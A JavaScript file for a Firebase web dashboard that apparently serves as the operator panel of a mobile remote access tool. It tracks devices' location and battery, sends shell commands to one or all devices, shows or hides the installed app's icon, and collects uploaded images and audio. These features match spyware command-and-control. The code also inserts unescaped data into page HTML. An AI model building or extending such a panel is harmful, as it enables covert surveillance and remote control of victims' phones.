
// Global variables
let currentUser = null;
let devices = new Map();
let commandHistory = [];
let logs = [];
let mediaFiles = [];

// Firebase references
let db, auth, storage;
let devicesRef, commandsRef, responsesRef, logsRef;

// Initialize when DOM is loaded
$(document).ready(function() {
    initializeFirebase();
    initializeAuth();
    initializeEventListeners();
    
    // Show dashboard by default
    showPage('dashboard');
});

/**
 * Initialize Firebase services and references
 */
function initializeFirebase() {
    try {
        // Initialize Firebase services
        auth = firebase.auth();
        db = firebase.database();
        storage = firebase.storage();
        
        // Initialize database references
        devicesRef = db.ref('devices');
        commandsRef = db.ref('commands');
        responsesRef = db.ref('responses');
        logsRef = db.ref('logs');
        
        updateConnectionStatus('connected', 'Connected to Firebase');
        console.log('Firebase initialized successfully');
        
    } catch (error) {
        console.error('Firebase initialization error:', error);
        updateConnectionStatus('error', 'Firebase connection failed: ' + error.message);
    }
}

/**
 * Initialize authentication state listener
 */
function initializeAuth() {
    auth.onAuthStateChanged(user => {
        if (user) {
            currentUser = user;
            $('#userEmail').text(user.email);
            
            // Setup real-time listeners after authentication
            setupRealtimeListeners();
            
            // Load initial data
            loadDashboardData();
            
            console.log('User authenticated:', user.email);
        } else {
            // User not authenticated, redirect to login
            window.location.href = 'login.html';
        }
    });
}

/**
 * Setup real-time Firebase listeners
 */
function setupRealtimeListeners() {
    // Listen for device changes
    devicesRef.on('value', snapshot => {
        devices.clear();
        if (snapshot.exists()) {
            snapshot.forEach(child => {
                const device = child.val();
                device.id = child.key;
                devices.set(child.key, device);
            });
        }
        updateDevicesUI();
        updateDashboardStats();
        updateDeviceSelect();
    }, error => {
        console.error('Devices listener error:', error);
        showToast('Error loading devices: ' + error.message, 'danger');
    });
    
    // Listen for new responses
    responsesRef.on('child_added', snapshot => {
        const response = snapshot.val();
        if (response) {
            console.log('New response:', response);
            
            // Add to logs
            addLog('response', `Response from ${response.deviceId}: ${response.message}`, 'info');
            
            // Handle media files
            if (response.fileUrl) {
                handleMediaFile(response);
            }
            
            // Show toast notification
            showToast(`Response from ${response.deviceId}`, 'success');
        }
    });
    
    // Listen for logs
    logsRef.limitToLast(100).on('value', snapshot => {
        logs = [];
        if (snapshot.exists()) {
            snapshot.forEach(child => {
                logs.push({
                    id: child.key,
                    ...child.val()
                });
            });
        }
        updateLogsUI();
    }, error => {
        console.error('Logs listener error:', error);
    });
}

/**
 * Initialize event listeners
 */
function initializeEventListeners() {
    // Command form submission
    $('#commandForm').on('submit', function(e) {
        e.preventDefault();
        sendCommand();
    });
    
    // Command type change
    $('#commandType').on('change', function() {
        const commandType = $(this).val();
        const paramsGroup = $('#paramsGroup');
        const paramsInput = $('#commandParams');
        
        // Show parameters field for specific commands
        if (commandType === 'shell_exec') {
            paramsGroup.show();
            paramsInput.attr('placeholder', 'Enter shell command (e.g., ls -la)');
        } else if (commandType === 'toggle_icon') {
            paramsGroup.show();
            paramsInput.attr('placeholder', 'Enter "show" or "hide"');
        } else {
            paramsGroup.hide();
        }
    });
    
    // Log search
    $('#logSearch').on('input', function() {
        const searchTerm = $(this).val().toLowerCase();
        filterLogs(searchTerm);
    });
}

/**
 * Show specific page and update navigation
 */
function showPage(pageId) {
    // Hide all pages
    $('.page').hide();
    
    // Show selected page
    $('#' + pageId).show();
    
    // Update navigation
    $('.nav-link').removeClass('active');
    $('.nav-link').each(function() {
        if ($(this).attr('onclick') && $(this).attr('onclick').includes(pageId)) {
            $(this).addClass('active');
        }
    });
    
    // Load page-specific data
    switch (pageId) {
        case 'dashboard':
            loadDashboardData();
            break;
        case 'devices':
            refreshDevices();
            break;
        case 'commands':
            updateDeviceSelect();
            loadCommandHistory();
            break;
        case 'logs':
            refreshLogs();
            break;
        case 'media':
            refreshMedia();
            break;
    }
}

/**
 * Load dashboard data and update stats
 */
function loadDashboardData() {
    updateDashboardStats();
    updateRecentActivity();
    updateOnlineDevicesList();
}

/**
 * Update dashboard statistics
 */
function updateDashboardStats() {
    const deviceCount = devices.size;
    const onlineCount = Array.from(devices.values()).filter(d => d.online).length;
    
    // Count commands from last 24 hours
    const oneDayAgo = Date.now() - (24 * 60 * 60 * 1000);
    const recentCommands = commandHistory.filter(cmd => cmd.timestamp > oneDayAgo).length;
    
    $('#deviceCount').text(deviceCount);
    $('#onlineCount').text(onlineCount);
    $('#commandCount').text(recentCommands);
    $('#mediaCount').text(mediaFiles.length);
}

/**
 * Update recent activity display
 */
function updateRecentActivity() {
    const recentLogs = logs.slice(-10).reverse();
    const container = $('#recentActivity');
    
    if (recentLogs.length === 0) {
        container.html('<div class="text-muted text-center">No recent activity</div>');
        return;
    }
    
    const activityHtml = recentLogs.map(log => `
        <div class="d-flex align-items-center mb-2 p-2 border-bottom">
            <i class="fas ${getLogIcon(log.type)} me-3 text-${getLogColor(log.level)}"></i>
            <div class="flex-grow-1">
                <div class="fw-bold">${log.message}</div>
                <small class="text-muted">${formatTimeAgo(log.timestamp)}</small>
            </div>
        </div>
    `).join('');
    
    container.html(activityHtml);
}

/**
 * Update online devices list
 */
function updateOnlineDevicesList() {
    const onlineDevices = Array.from(devices.values()).filter(d => d.online);
    const container = $('#onlineDevices');
    
    if (onlineDevices.length === 0) {
        container.html('<div class="text-muted text-center">No devices online</div>');
        return;
    }
    
    const devicesHtml = onlineDevices.map(device => `
        <div class="d-flex align-items-center justify-content-between mb-2 p-2 bg-light rounded">
            <div>
                <div class="fw-bold">${device.model || 'Unknown Model'}</div>
                <small class="text-muted">${device.id}</small>
            </div>
            <span class="badge bg-success">Online</span>
        </div>
    `).join('');
    
    container.html(devicesHtml);
}

/**
 * Update devices table
 */
function updateDevicesUI() {
    const tbody = $('#devicesTable');
    
    if (devices.size === 0) {
        tbody.html('<tr><td colspan="7" class="text-center text-muted">No devices connected</td></tr>');
        return;
    }
    
    const deviceRows = Array.from(devices.entries()).map(([id, device]) => `
        <tr>
            <td><code>${id}</code></td>
            <td>${device.model || 'Unknown'}</td>
            <td>
                <span class="badge bg-${device.online ? 'success' : 'secondary'}">
                    ${device.online ? 'Online' : 'Offline'}
                </span>
            </td>
            <td>${device.battery ? device.battery + '%' : 'N/A'}</td>
            <td>${device.location ? `${device.location.lat}, ${device.location.lng}` : 'N/A'}</td>
            <td>${device.lastSeen ? formatTimeAgo(device.lastSeen) : 'Never'}</td>
            <td>
                <button class="btn btn-primary btn-sm" onclick="selectDeviceForCommand('${id}')">
                    <i class="fas fa-paper-plane"></i> Command
                </button>
                <button class="btn btn-danger btn-sm" onclick="removeDevice('${id}')">
                    <i class="fas fa-trash"></i> Remove
                </button>
            </td>
        </tr>
    `).join('');
    
    tbody.html(deviceRows);
}

/**
 * Update device select dropdown
 */
function updateDeviceSelect() {
    const select = $('#targetDevice');
    const currentValue = select.val();
    
    select.empty();
    select.append('<option value="">Select device...</option>');
    select.append('<option value="all">All Devices</option>');
    
    devices.forEach((device, id) => {
        select.append(`<option value="${id}">${device.model || 'Unknown'} (${id})</option>`);
    });
    
    // Restore previous selection if it still exists
    if (currentValue && (currentValue === 'all' || devices.has(currentValue))) {
        select.val(currentValue);
    }
}

/**
 * Send command to device(s)
 */
function sendCommand() {
    const targetDevice = $('#targetDevice').val();
    const commandType = $('#commandType').val();
    const commandParams = $('#commandParams').val();
    
    if (!targetDevice || !commandType) {
        showToast('Please select target device and command type', 'warning');
        return;
    }
    
    const command = {
        type: commandType,
        params: commandParams || null,
        timestamp: Date.now(),
        sender: currentUser.email,
        status: 'sent'
    };
    
    // Show loading state
    const submitBtn = $('#commandForm button[type="submit"]');
    const originalText = submitBtn.html();
    submitBtn.html('<i class="fas fa-spinner fa-spin me-2"></i>Sending...').prop('disabled', true);
    
    if (targetDevice === 'all') {
        // Send to all devices
        const promises = [];
        devices.forEach((device, deviceId) => {
            promises.push(sendCommandToDevice(deviceId, command));
        });
        
        Promise.all(promises).then(() => {
            showToast(`Command sent to all ${devices.size} devices`, 'success');
            addToCommandHistory(targetDevice, command);
        }).catch(error => {
            console.error('Error sending commands:', error);
            showToast('Error sending commands to some devices', 'danger');
        }).finally(() => {
            submitBtn.html(originalText).prop('disabled', false);
        });
        
    } else {
        // Send to specific device
        sendCommandToDevice(targetDevice, command).then(() => {
            showToast(`Command sent to ${targetDevice}`, 'success');
            addToCommandHistory(targetDevice, command);
        }).catch(error => {
            console.error('Error sending command:', error);
            showToast('Error sending command: ' + error.message, 'danger');
        }).finally(() => {
            submitBtn.html(originalText).prop('disabled', false);
        });
    }
    
    // Reset form
    $('#commandForm')[0].reset();
    $('#paramsGroup').hide();
}

/**
 * Send command to specific device
 */
function sendCommandToDevice(deviceId, command) {
    return commandsRef.child(deviceId).push(command);
}

/**
 * Add command to history
 */
function addToCommandHistory(target, command) {
    const historyItem = {
        target: target,
        command: command,
        timestamp: Date.now()
    };
    
    commandHistory.push(historyItem);
    
    // Keep only last 50 commands
    if (commandHistory.length > 50) {
        commandHistory = commandHistory.slice(-50);
    }
    
    // Add to logs
    addLog('command', `Command "${command.type}" sent to ${target === 'all' ? 'all devices' : target}`, 'info');
    
    // Update UI
    loadCommandHistory();
}

/**
 * Load and display command history
 */
function loadCommandHistory() {
    const container = $('#commandHistory');
    
    if (commandHistory.length === 0) {
        container.html('<div class="text-muted text-center">No commands sent yet</div>');
        return;
    }
    
    const historyHtml = commandHistory.slice(-10).reverse().map(item => `
        <div class="border-bottom pb-2 mb-2">
            <div class="d-flex justify-content-between align-items-start">
                <div>
                    <strong>${item.command.type}</strong>
                    <div class="text-muted small">Target: ${item.target === 'all' ? 'All Devices' : item.target}</div>
                    ${item.command.params ? `<div class="text-muted small">Params: ${item.command.params}</div>` : ''}
                </div>
                <small class="text-muted">${formatTimeAgo(item.timestamp)}</small>
            </div>
        </div>
    `).join('');
    
    container.html(historyHtml);
}

/**
 * Update logs display
 */
function updateLogsUI() {
    const container = $('#logsContainer');
    
    if (logs.length === 0) {
        container.html('<div class="text-muted text-center">No logs available</div>');
        return;
    }
    
    const sortedLogs = logs.slice().reverse();
    const logsHtml = sortedLogs.map(log => `
        <div class="log-entry mb-1" data-log-content="${log.message.toLowerCase()}">
            <span class="text-muted me-3">${new Date(log.timestamp).toLocaleString()}</span>
            <span class="badge bg-${getLogColor(log.level)} me-3">${log.level.toUpperCase()}</span>
            <span class="log-message">${log.message}</span>
        </div>
    `).join('');
    
    container.html(logsHtml);
}

/**
 * Filter logs based on search term
 */
function filterLogs(searchTerm) {
    const logEntries = $('.log-entry');
    
    if (!searchTerm) {
        logEntries.show();
        return;
    }
    
    logEntries.each(function() {
        const logContent = $(this).data('log-content');
        if (logContent.includes(searchTerm)) {
            $(this).show();
        } else {
            $(this).hide();
        }
    });
}

/**
 * Add log entry
 */
function addLog(type, message, level = 'info') {
    const logEntry = {
        type: type,
        message: message,
        level: level,
        timestamp: Date.now(),
        deviceId: 'admin-panel'
    };
    
    logsRef.push(logEntry).catch(error => {
        console.error('Error adding log:', error);
    });
}

/**
 * Clear all logs
 */
function clearLogs() {
    if (confirm('Are you sure you want to clear all logs? This action cannot be undone.')) {
        logsRef.remove().then(() => {
            showToast('Logs cleared successfully', 'success');
        }).catch(error => {
            console.error('Error clearing logs:', error);
            showToast('Error clearing logs: ' + error.message, 'danger');
        });
    }
}

/**
 * Handle media file from response
 */
function handleMediaFile(response) {
    const mediaFile = {
        id: Date.now().toString(),
        name: response.fileName || 'Unknown file',
        url: response.fileUrl,
        type: response.fileType || 'application/octet-stream',
        timestamp: response.timestamp || Date.now(),
        deviceId: response.deviceId
    };
    
    mediaFiles.push(mediaFile);
    updateDashboardStats();
}

/**
 * Refresh media files from Firebase Storage
 */
function refreshMedia() {
    const container = $('#mediaGrid');
    container.html('<div class="col-12 text-center"><i class="fas fa-spinner fa-spin"></i> Loading media files...</div>');
    
    // Load images
    const storageRef = storage.ref();
    const imagesRef = storageRef.child('images');
    const audioRef = storageRef.child('audio');
    
    Promise.all([
        loadMediaFromRef(imagesRef, 'image'),
        loadMediaFromRef(audioRef, 'audio')
    ]).then(() => {
        updateMediaUI();
    }).catch(error => {
        console.error('Error loading media:', error);
        container.html('<div class="col-12 text-center text-danger">Error loading media files</div>');
    });
}

/**
 * Load media files from storage reference
 */
function loadMediaFromRef(ref, type) {
    return ref.listAll().then(result => {
        const promises = result.items.map(item => {
            return item.getDownloadURL().then(url => {
                const mediaFile = {
                    id: item.name,
                    name: item.name,
                    url: url,
                    type: type,
                    timestamp: Date.now()
                };
                
                // Check if already exists
                const existingIndex = mediaFiles.findIndex(f => f.id === item.name);
                if (existingIndex >= 0) {
                    mediaFiles[existingIndex] = mediaFile;
                } else {
                    mediaFiles.push(mediaFile);
                }
            });
        });
        
        return Promise.all(promises);
    });
}

/**
 * Update media UI
 */
function updateMediaUI() {
    const container = $('#mediaGrid');
    
    if (mediaFiles.length === 0) {
        container.html('<div class="col-12 text-center text-muted">No media files found</div>');
        return;
    }
    
    const mediaHtml = mediaFiles.map(file => {
        if (file.type === 'image' || file.name.match(/\.(jpg|jpeg|png|gif)$/i)) {
            return `
                <div class="col-lg-3 col-md-4 col-sm-6 mb-3">
                    <div class="card">
                        <img src="${file.url}" class="card-img-top" style="height: 200px; object-fit: cover; cursor: pointer;" 
                             onclick="viewMedia('${file.url}', '${file.name}')">
                        <div class="card-body">
                            <h6 class="card-title">${file.name}</h6>
                            <p class="card-text small text-muted">${formatTimeAgo(file.timestamp)}</p>
                            <a href="${file.url}" class="btn btn-primary btn-sm" target="_blank">
                                <i class="fas fa-external-link-alt"></i> View
                            </a>
                        </div>
                    </div>
                </div>
            `;
        } else {
            return `
                <div class="col-lg-3 col-md-4 col-sm-6 mb-3">
                    <div class="card">
                        <div class="card-body text-center">
                            <i class="fas fa-file-audio fa-3x text-muted mb-3"></i>
                            <h6 class="card-title">${file.name}</h6>
                            <p class="card-text small text-muted">${formatTimeAgo(file.timestamp)}</p>
                            <audio controls class="w-100 mb-2">
                                <source src="${file.url}" type="audio/mpeg">
                                Your browser does not support the audio element.
                            </audio>
                            <a href="${file.url}" class="btn btn-primary btn-sm" target="_blank">
                                <i class="fas fa-download"></i> Download
                            </a>
                        </div>
                    </div>
                </div>
            `;
        }
    }).join('');
    
    container.html(mediaHtml);
}

/**
 * View media in modal
 */
function viewMedia(url, name) {
    // Create modal dynamically
    const modal = $(`
        <div class="modal fade" id="mediaModal" tabindex="-1">
            <div class="modal-dialog modal-lg">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title">${name}</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                    </div>
                    <div class="modal-body text-center">
                        <img src="${url}" class="img-fluid" alt="${name}">
                    </div>
                    <div class="modal-footer">
                        <a href="${url}" class="btn btn-primary" target="_blank">
                            <i class="fas fa-external-link-alt"></i> Open in New Tab
                        </a>
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                    </div>
                </div>
            </div>
        </div>
    `);
    
    $('body').append(modal);
    const bsModal = new bootstrap.Modal(modal[0]);
    bsModal.show();
    
    // Remove modal when hidden
    modal.on('hidden.bs.modal', function() {
        modal.remove();
    });
}

/**
 * Refresh functions for each page
 */
function refreshDevices() {
    // Devices are updated in real-time, just show loading briefly
    const tbody = $('#devicesTable');
    tbody.html('<tr><td colspan="7" class="text-center"><i class="fas fa-spinner fa-spin"></i> Refreshing...</td></tr>');
    
    setTimeout(() => {
        updateDevicesUI();
    }, 500);
}

function refreshLogs() {
    const container = $('#logsContainer');
    container.html('<div class="text-center"><i class="fas fa-spinner fa-spin"></i> Refreshing logs...</div>');
    
    setTimeout(() => {
        updateLogsUI();
    }, 500);
}

/**
 * Device management functions
 */
function selectDeviceForCommand(deviceId) {
    showPage('commands');
    $('#targetDevice').val(deviceId);
}

function removeDevice(deviceId) {
    if (confirm(`Are you sure you want to remove device ${deviceId}?`)) {
        devicesRef.child(deviceId).remove().then(() => {
            showToast('Device removed successfully', 'success');
            addLog('device', `Device ${deviceId} removed`, 'warning');
        }).catch(error => {
            console.error('Error removing device:', error);
            showToast('Error removing device: ' + error.message, 'danger');
        });
    }
}

/**
 * Logout function
 */
function logout() {
    if (confirm('Are you sure you want to logout?')) {
        auth.signOut().then(() => {
            window.location.href = 'login.html';
        }).catch(error => {
            console.error('Logout error:', error);
            showToast('Error logging out: ' + error.message, 'danger');
        });
    }
}

/**
 * Utility functions
 */
function updateConnectionStatus(status, message) {
    const statusElement = $('#connectionStatus');
    const statusIcon = $('#statusIcon');
    const statusText = $('#statusText');
    
    statusElement.removeClass('alert-info alert-success alert-danger');
    
    switch (status) {
        case 'connected':
            statusElement.addClass('alert-success');
            statusIcon.removeClass().addClass('fas fa-check-circle me-2 text-success');
            break;
        case 'error':
            statusElement.addClass('alert-danger');
            statusIcon.removeClass().addClass('fas fa-exclamation-circle me-2 text-danger');
            break;
        default:
            statusElement.addClass('alert-info');
            statusIcon.removeClass().addClass('fas fa-spinner fa-spin me-2');
    }
    
    statusText.text(message);
}

function getLogIcon(type) {
    const icons = {
        device: 'fa-mobile-alt',
        command: 'fa-paper-plane',
        response: 'fa-reply',
        system: 'fa-cog',
        error: 'fa-exclamation-triangle'
    };
    return icons[type] || 'fa-info-circle';
}

function getLogColor(level) {
    const colors = {
        error: 'danger',
        warning: 'warning',
        info: 'info',
        success: 'success'
    };
    return colors[level] || 'secondary';
}

function formatTimeAgo(timestamp) {
    const now = Date.now();
    const diffInSeconds = Math.floor((now - timestamp) / 1000);
    
    if (diffInSeconds < 60) {
        return `${diffInSeconds}s ago`;
    } else if (diffInSeconds < 3600) {
        const minutes = Math.floor(diffInSeconds / 60);
        return `${minutes}m ago`;
    } else if (diffInSeconds < 86400) {
        const hours = Math.floor(diffInSeconds / 3600);
        return `${hours}h ago`;
    } else {
        const days = Math.floor(diffInSeconds / 86400);
        return `${days}d ago`;
    }
}

function showToast(message, type = 'info') {
    const toastId = 'toast-' + Date.now();
    const toast = $(`
        <div class="toast align-items-center text-white bg-${type} border-0" role="alert" id="${toastId}">
            <div class="d-flex">
                <div class="toast-body">
                    <i class="fas ${type === 'success' ? 'fa-check-circle' : type === 'danger' ? 'fa-exclamation-circle' : 'fa-info-circle'} me-2"></i>
                    ${message}
                </div>
                <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"></button>
            </div>
        </div>
    `);
    
    $('#toastContainer').append(toast);
    
    const bsToast = new bootstrap.Toast(toast[0], {
        autohide: true,
        delay: 5000
    });
    
    bsToast.show();
    
    // Remove toast element after it's hidden
    toast.on('hidden.bs.toast', function() {
        toast.remove();
    });
}

// Global functions for onclick handlers
window.showPage = showPage;
window.refreshDevices = refreshDevices;
window.refreshLogs = refreshLogs;
window.refreshMedia = refreshMedia;
window.clearLogs = clearLogs;
window.selectDeviceForCommand = selectDeviceForCommand;
window.removeDevice = removeDevice;
window.viewMedia = viewMedia;
window.logout = logout;
